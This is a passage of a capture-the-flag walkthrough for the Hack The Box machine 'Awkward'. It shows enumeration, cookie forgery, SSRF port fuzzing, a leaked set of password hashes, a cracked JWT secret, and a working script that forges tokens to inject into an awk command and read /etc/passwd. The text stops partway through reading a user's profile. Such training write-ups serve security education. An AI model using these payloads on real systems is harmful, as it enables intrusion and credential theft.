# Awkward HTB Walkthrough


![Awkward](./awkward.png)

## Introduction

A challenging machine offering a VueJS app backed by an Express API.  There's also a separate PHP web store app to exploit for privilege escalation and gaining root access on the machine. This was the next medium machine on my list to tick off in my quest to progress to more difficult boxes and gain further experience.

As you'll see, I had some fun with enumerating things, and my notes reflect this. What's missing is the little rabbit holes I went down, and I usually leave these out unless they provide further clues / bread crumbs.  My write ups are already quite lengthy, and I don't want to bore people.. too much!

Outside of some fiddly enumeration, this machine involves cookie forgery, server side request forgery, a local file inclusion attack on an API -- which we use for further enumeration, a little forensics on user files to gain a foothold.  With a foothold, things become a little clearer and we find a partially developed PHP web store we can view the source for and find a command injection vulnerability triggered when removing items from our cart.  This gives us www-data access on the machine, and by running [pspy](https://github.com/DominicBreuker/pspy), we see a recurring cron job running as root we are able to exploit by command injecting into the `mail` command.

## Enumeration

As always, let's start with an nmap scan:

```bash
$nmap -sC -sV -oA nmap/initial 10.10.11.185
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-30 19:25 AEDT
Nmap scan report for 10.10.11.185
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
```

After adding the hat-valley.htb redirect to `/etc/hosts` and navigating to http://hat-valley.htb/ - we are greeted with:

![](./assets/2023-01-30-19-29-02-image.png)

There is a form further down for submitting your contact details and a message, but this isn't active -- it basically seems like the site is just static content. The favicon and javascript bundle at `/js/app.js` indicates this is a Vue.js app.

Let's enumerate paths in gobuster with Parrot's big.txt wordlist:

```bash
$gobuster dir -u http://hat-valley.htb -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hat-valley.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/30 19:31:26 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 173] [--> /css/]
/favicon.ico          (Status: 200) [Size: 4286]           
/js                   (Status: 301) [Size: 171] [--> /js/] 
/secci�               (Status: 500) [Size: 1704]           
/static               (Status: 301) [Size: 179] [--> /static/]
                                                              
===============================================================
2023/01/30 19:32:31 Finished
===============================================================

```

The request above with unprintable character is a bit strange, and gives a 500 error -- which could be something to investigate -- does the web server barf on certain characters?

In Firefox developer tools when loading the page, I notice SockJs requests to http://localhost:8080/sockjs-node/info?t=1675067935305 which obviously fail.

`/js/app.js` also references this as the webpack-dev-server:

```js
/***/ (function(module, exports, __webpack_require__) {

__webpack_require__(/*! /var/www/hat-valley.htb/node_modules/webpack/hot/dev-server.js */"./node_modules/webpack/hot/dev-server.js");
__webpack_require__(/*! /var/www/hat-valley.htb/node_modules/webpack-dev-server/client/index.js?http://localhost:8080&sockPath=/sockjs-node */"./node_modules/webpack-dev-server/client/index.js?http://localhost:8080&sockPath=/sockjs-node");
module.exports = __webpack_require__(/*! ./src/main.js */"./src/main.js");
```

Browsing to http://hat-valley.htb/sockjs-node shows me I can access the web socket:

![](./assets/2023-01-30-19-45-54-image.png)

I searched around and played with `websocat` to see if I could somehow initiate a websocket, but didn't have any luck.  What we can gather is that the Vue.js app is likely running on webpack-dev-server, and contains symbols and other useful information showing us the relative paths of files for the application.  So, let's assume we're looking at a work in progress web app.

Browsing through `/js/app.js` again, I found references to `./src/Dashboard.vue` and `./src/HR.vue`

```js

/***/ "./src/Dashboard.vue":
/*!***************************!*\
  !*** ./src/Dashboard.vue ***!
  \***************************/
/*! exports provided: default */
/***/ (function(module, __webpack_exports__, __webpack_require__) {


/***/ "./src/HR.vue":
/*!********************!*\
  !*** ./src/HR.vue ***!
  \********************/
/*! exports provided: default */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

```

Browsing to http://hat-valley.htb/dashboard redirects us to http://hat-valley.htb/hr:

![](./assets/2023-01-30-20-53-51-image.png)

## Foothold

Let's try and log in with admin / foobar, and intercept the request in Burp Suite:

```
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://hat-valley.htb/hr
Content-Type: application/json
Content-Length: 40
Origin: http://hat-valley.htb
DNT: 1
Connection: close
Cookie: token=guest
Pragma: no-cache
Cache-Control: no-cache

{"username":"admin","password":"foobar"}
```

I attempted a basic login bypass with the following payload substituted into the above:

```

{
  "username": {
    "$ne": null
  },
  "password": {
    "$ne": null
   }
}
```

And received the following response from the web server.  Not the response I was hoping for, but nonetheless, stack traces are useful in reconnaissance for seeing what framework, libraries, paths, etc are being used.

```
TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or
an instance of Buffer, ArrayBuffer, or Array or an Array-like Object.
Received an instance of Object<br>
&nbsp; &nbsp;at Function.from (buffer.js:330:9)<br>
&nbsp; &nbsp;at new Buffer (buffer.js:286:17)<br>
&nbsp; &nbsp;at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:30:76<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
```

I tried a few Node and Mongo bypass techniques, and tried setting the `token=admin` in the Cookie header of the request. 

When changing this in my browser and refreshing the page (without actually submitting to the login api), I was presented with a dashboard:

![](./assets/2023-01-30-21-18-04-image.png)

I notice a list of URLs in dev tools, and if I filter on XHR, I see:

![](./assets/2023-01-30-21-37-26-image.png)

The store status URL is http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22, which gives me a 200 okay with no response:

```bash
$curl -v "http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22"
*   Trying 10.10.11.185:80...
* Connected to hat-valley.htb (10.10.11.185) port 80 (#0)
> GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
> Host: hat-valley.htb
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 30 Jan 2023 10:38:06 GMT
< Content-Length: 0
< Connection: keep-alive
< x-powered-by: Express
< access-control-allow-origin: *
< 
* Connection #0 to host hat-valley.htb left intact

```

Changing the `url` query param in the above to point at my own machine, while running a basic python HTTP server locally, I see the app does indeed hit my web server:

```bash
$sudo python -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.185 - - [30/Jan/2023 21:41:48] "GET / HTTP/1.1" 200 -

```

The web server also serves up the index.html here (that's an empty iframe attempting to unsuccessfully load `/etc/passwd`):

![](./assets/2023-01-30-21-43-19-image.png)

Browsing to http://store.hat-valley.htb/ from my own machine, I get a login prompt

![](./assets/2023-01-30-21-45-14-image.png)

I thought perhaps when retrieving the URL in the query param, maybe the server sets basic auth headers -- so I tried listening on netcat and going to http://hat-valley.htb/api/store-status?url=%22http://10.10.14.17%22, hoping to capture some headers:

```
$sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.185] 50746
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.27.2
Host: 10.10.14.17
Connection: close

```
Nothing :(

Next up, I tried different Local File Inclusion techniques - `"../../../../etc/hosts"` ,`"file://../../../../etc/hosts"` and a few other variations in the query param -- but just received empty 200 responses.

The dashboard page also makes a GET to http://hat-valley.htb/api/staff-details, but fails due to an invalid JWT, probably from our auth bypass by setting the cookie:

```
JsonWebTokenError: jwt malformed
    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
    at /var/www/hat-valley.htb/server/server.js:151:30
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)
```

I was able to "copy as cURL" for the staff-details request, then remove the Cookie header (no auth required!), and receive data -- and it looks quite juicy!:

```bash
$curl 'http://hat-valley.htb/api/staff-details' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://hat-valley.htb/dashboard' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   775  100   775    0     0  15509      0 --:--:-- --:--:-- --:--:-- 15816
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

This time around, I thought I would enter all the hashes into crack station (because cracking in a VM is slow) -- and we found a match!:

![](./assets/2023-01-30-22-06-35-image.png)

So we have user / pass pair christopher.jones / chris123, which I tried for accessing http://store.hat-valley.htb.  This didn't work, but I wiped my browser cookie, and was able to log back in to the main HR dashboard web app using these credentials:

![](./assets/2023-01-30-22-09-21-image.png)

We also have a leave request form that appears to detect basic XSS:

![](./assets/2023-01-31-21-11-23-image.png)

We can see in developer tools, the leave request history is populated from http://hat-valley.htb/api/all-leave

```bash
$curl -s 'http://hat-valley.htb/api/all-leave' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MDc2OTEwfQ.GflAx7TisfVXN3hW3W5-Aryd5Smhoo3y1rh3DpGq5QY'
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes

```

I tried entering a leave reason with commas, which is accepted input, and this seems to screw up fields:

```bash
$curl -s 'http://hat-valley.htb/api/all-leave' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MDc2OTEwfQ.GflAx7TisfVXN3hW3W5-Aryd5Smhoo3y1rh3DpGq5QY'
christopher.jones,,foo,bar,25/01/2023,02/02/2023,Pending

```

I finally decided to run http://store.hat-valley.htb through gobuster to find other URL paths:

```bash
gobuster dir -u http://store.hat-valley.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.hat-valley.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/31 22:44:55 Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 401) [Size: 188]
/cart                 (Status: 301) [Size: 178] [--> http://store.hat-valley.htb/cart/]
/css                  (Status: 301) [Size: 178] [--> http://store.hat-valley.htb/css/] 
/fonts                (Status: 301) [Size: 178] [--> http://store.hat-valley.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://store.hat-valley.htb/img/]  
/index.php            (Status: 401) [Size: 188]                                         
/info.php             (Status: 401) [Size: 188]                                         
/js                   (Status: 301) [Size: 178] [--> http://store.hat-valley.htb/js/]   
/phpinfo.php          (Status: 401) [Size: 188]                                         
/static               (Status: 301) [Size: 178] [--> http://store.hat-valley.htb/static/]
/xmlrpc.php           (Status: 401) [Size: 188]                                          
/xmlrpc_server.php    (Status: 401) [Size: 188]         
```

I tried Server Side Request Forgery (SSRF) with the URLs above, and for http://hat-valley.htb (including `/api/all-leave`, `/api/login`) via http://hat-valley.htb/api/store-status?url="URL", and each time would get a 200 response.  I noticed in the webpack file:

```
WEBPACK_IMPORTED_MODULE_2__["default"]
    .store_status("http://store.hat-valley.htb")
    .then(function (data) {
        if (data.length > 0) {
            _this.status = "Up";
            _this.color = "green"
        } else {
            _this.status = "Down";
        }
    })
```

So an empty 200 response when we attempt SSRF probably means the URL was unreachable if the body is empty.  I was able to validate this by running a web server locally and hitting http://hat-valley.htb/api/store-status?url=htt://10.10.14.48 . The response would contain the body of the index file I served up (as per above).

I thought perhaps serving up a PHP or Node file might allow RCE if the server executes the file as part of rendering to the browser, but this didn't work -- just the file contents were returned -- no parsing and interpreting :(

I ran `ffuf` to enumerate local endpoints, but filter out 0 byte responses -- and similar for store.hat-valley.htb, but did not find anything:

```bash
ffuf -u "http://hat-valley.htb/api/store-status?url=%22http:%2F%2F127.0.0.1/FUZZ%22" -w /usr/share/dirb/wordlists/common.txt -fs 0
                        [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 172ms]
index.html              [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 64ms]
:: Progress: [4614/4614] :: Job [1/1] :: 391 req/sec :: Duration: [0:00:16] :: Er

$ffuf -u "http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb/FUZZ%22" -w /usr/share/dirb/wordlists/common.txt -fs 0
:: Progress: [4614/4614] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

```

Given we already know we're dealing with a dev server, we can try fuzzing the port to see if the store is running on a different port which perhaps explains why it's showing as 'down' -- so we create a text file of all ports 1-65535 by running `(seq 1 65535) > ports.txt`, and we fuzz the port in the URL using this newly created file:

```bash
$ffuf -u "http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:FUZZ/%22" -w ports.txt -fs 0
3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 194ms]
8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 513ms]
```

Let's check out port 8080:

```bash
$curl -v 'http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:8080%22' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MjQyNzMzfQ.baG3nt6GCFrvWeuSbXrYaEfxpYatAw-Rx9IUTiIH5n8'
*   Trying 10.10.11.185:80...
* Connected to hat-valley.htb (10.10.11.185) port 80 (#0)
> GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:8080%22 HTTP/1.1
> Host: hat-valley.htb
> User-Agent: curl/7.87.0
> Accept: */*
> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MjQyNzMzfQ.baG3nt6GCFrvWeuSbXrYaEfxpYatAw-Rx9IUTiIH5n8
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 01 Feb 2023 09:34:28 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 2881
< Connection: keep-alive
< x-powered-by: Express
< access-control-allow-origin: *
< etag: W/"b41-tn8t3x3qcvcm126OQ/i0AXwBj8M"
< 
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel = "stylesheet" href = "/css/main.css">
    <link rel="stylesheet" href="/css/bootstrap.min.css">
    <!-- style css -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- Responsive-->
    <link rel="stylesheet" href="/css/responsive.css">
    <!-- fevicon -->
    <link rel="icon" href="/static/blue.png" type="image/png" />
    <!-- Scrollbar Custom CSS -->
    <link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
    <!-- Tweaks for older IEs-->
    <link rel="stylesheet" href="/css/font-awesome.css">
    <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="screen">
    <link rel="stylesheet" href="/static/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/static/vendors/feather/feather.css">
    <link rel="stylesheet" href="/static/vendors/base/vendor.bundle.base.css">
    <link rel="stylesheet" href="/static/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="/static/vendors/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/static/vendors/jquery-bar-rating/fontawesome-stars-o.css">
    <link rel="stylesheet" href="/static/vendors/jquery-bar-rating/fontawesome-stars.css">
    <link rel="stylesheet" href="/static/css/style.css">
    <title>Hat Valley</title>
  <link href="/js/app.js" rel="preload" as="script"><link href="/js/chunk-vendors.js" rel="preload" as="script"></head>
  <body>
    <noscript>
      <strong>We're sorry but hat-valley doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/popper.min.js"></script>
    <script src="/js/bootstrap.bundle.min.js"></script>
    <script src="/js/jquery-3.0.0.min.js"></script>
    <script src="/js/plugin.js"></script>
    <!-- sidebar -->
    <script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="/js/custom.js"></script>
    <script src="/js/jquery.fancybox.min.js"></script>

    <script src="/static/vendors/base/vendor.bundle.base.js"></script>
    <script src="/static/js/off-canvas.js"></script>
    <script src="/static/js/hoverable-collapse.js"></script>
    <script src="/static/js/template.js"></script>
    <script src="/static/vendors/chart.js/Chart.min.js"></script>
    <script src="/static/vendors/jquery-bar-rating/jquery.barrating.min.js"></script>
    <script src="/static/js/dashboard.js"></script>
  <script type="text/javascript" src="/js/chunk-vendors.js"></script><script type="text/javascript" src="/js/app.js"></script></body>
</html>

```

So we've confirmed port 8080 is likely the internal port serving the main web-app we've been accessing via port 80 externally.  If we look at 3002 by browsing to [http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:3002%22](http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:3002%22), it looks like we have the API:

![](./assets/2023-02-01-20-40-26-image.png)

Not only that, but we get the Express / Node code for each route! Super handy, thanks!  The first thing that immediately stood out was an `exec` in the `/api/all-leave` endpoint -- which calls out to awk (and awkward is the machine name.. geddit?).  This returns lines of leave in the CSV for the given user (taken from the JWT and returns these in the response:

```js
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null

  if(user_token) {

    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)

    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }

  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }

  if(!user) {
    return res.status(500).send("Invalid user")
  }

  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }


  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }

    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }

    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
```

So first, we need to control the username which means we need to be able to sign JWTs, given the username is pulled from a decoded JWT -- and then the username is checked for some bad characters, which we can't include in our payload.  We don't have the JWT signing key `TOKEN_SECRET`, but maybe we can crack it (assuming it's weak) using our existing token provided to us when logging in with the compromised christopher.jones account?

Using [jwt-cli](https://github.com/mike-engel/jwt-cli), written in rust:

```bash
$jwt decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1NDE3NzcyfQ.O66uNpvfZtH5Ifi8Cdvc8VssC_zK55fN-aA8nMJcbFc

Token header
------------
{
  "typ": "JWT",
  "alg": "HS256"
}

Token claims
------------
{
  "iat": 1675417772,
  "username": "christopher.jones"
}

```

Based on the algorithm, it looks like we can attempt to crack JWT with hashcat, using mode 16500 for `JWT (JSON Web Token)`.  As always, I start with `rockyou.txt`:

```bash
$hashcat -m 16500 -a 0 jwt_token.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

INFO: All hashes found in potfile! Use --show to display them.

Started: Fri Feb  3 21:04:26 2023
Stopped: Fri Feb  3 21:04:26 2023
┌─[zara@supernova]─[~/hat-valley]
└──╼ $hashcat -m 16500 -a 0 jwt_token.txt --show /usr/share/wordlists/rockyou.txt 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1NDE3NzcyfQ.O66uNpvfZtH5Ifi8Cdvc8VssC_zK55fN-aA8nMJcbFc:123beany123

```

So, the TOKEN_SECRET is `123beany123`.

I played around with a basic replication of the above express endpoint locally, and worked out we can escape awk and do basic Local File Inclusion with a custom username. E.g.:

```
/' /etc/passwd '/
```

This will result in the following -- showing us all lines of `/etc/passwd` or any file the web server's user account has permission to read, rather than the expected CSV file:

```bash
awk '//' /etc/passwd '//' /var/www/private/leave_requests.csv
```

I ran this LFI against a couple of files which didn't lead anywhere.  At this point, suspecting more enumeration across files was required, I decided to write a script taking any filename as an argument to simplify things -- then testing this script for `/etc/passwd`, injecting this path into the username of the encoded JWT, which gave the following results:

```bash
$cat lfi.sh 
#!/usr/bin/env bash

JSON_PAYLOAD=$(cat << EOF
{"username": "/' ${1} '/"}
EOF
)

JWT=$(jwt encode --secret 123beany123 "$JSON_PAYLOAD")

echo "Sending JWT with curl request: ${JWT}"
curl 'http://hat-valley.htb/api/all-leave' -H "Cookie: token=${JWT}"

$./lfi.sh /etc/passwd
Sending JWT with curl request: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzU0OTU1MDAsInVzZXJuYW1lIjoiLycgL2V0Yy9wYXNzd2QgJy8ifQ.j3fsA9EF4hIRr9Rdt2xlJkJ99yDPT4400lJu4lZWFnQ
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:999::/var/log/laurel:/bin/false


```

Let's filter on users with a valid login shell, by removing those with a shell of `/bin/false` or `/usr/sbin/nologin`:

```bash
$grep -vE '/bin/false|/usr/sbin/nologin' users.txt 
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

`bean` and `christine` both look interesting.  It looks like I can't reach christine's `.profile` file (or it doesn't exist), but I can read bean's `.profile`:

```bash
 $./lfi.sh /home/bean/.profile
Sending JWT with curl request: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzU0OTU2OTksInVzZXJuYW1lIjoiLycgL2hvbWUvYmVhbi8ucHJvZmlsZSAnLyJ9.TzLw2s13gwZy-eF-QaosBNv3hd09CCvBl0IEfGePm6A
# ~/.profile: executed by the command interpreter for login shells.
